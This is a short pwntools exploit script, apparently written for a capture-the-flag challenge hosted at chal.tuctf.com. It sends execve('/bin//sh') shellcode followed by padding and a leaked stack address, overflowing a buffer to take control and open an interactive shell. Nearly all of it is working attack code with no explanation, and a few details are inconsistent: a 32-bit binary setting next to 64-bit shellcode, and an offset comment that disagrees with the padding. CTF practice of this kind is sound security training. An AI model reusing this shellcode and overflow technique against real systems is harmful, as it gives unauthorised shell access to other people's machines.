from pwn import *

context.binary = "./shellme32"
#context.terminal = ["tmux", "split", "-h"]

#r = process("./shellme64")

#gdb.attach(r)

r = remote('chal.tuctf.com', 30507)

payload = ""
shellcode =  "\x50\x48\x31\xd2\x48\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05"
 
#r.sendline(shellcode + cyclic(512))
# offset is 17

print r.recvline()
#base_addr = u32(r.recv(4).ljust(4, "\x00"))

#print("Base Address Leak: " + hex(base_addr))

payload = shellcode
payload += "A" * 16

print("Leaked address: " + r.recvline())

in_addr = raw_input("Type leak address:")
base_addr = int(in_addr, 16)
print hex(base_addr)
payload += p64(base_addr)

r.sendline(payload)

r.interactive()
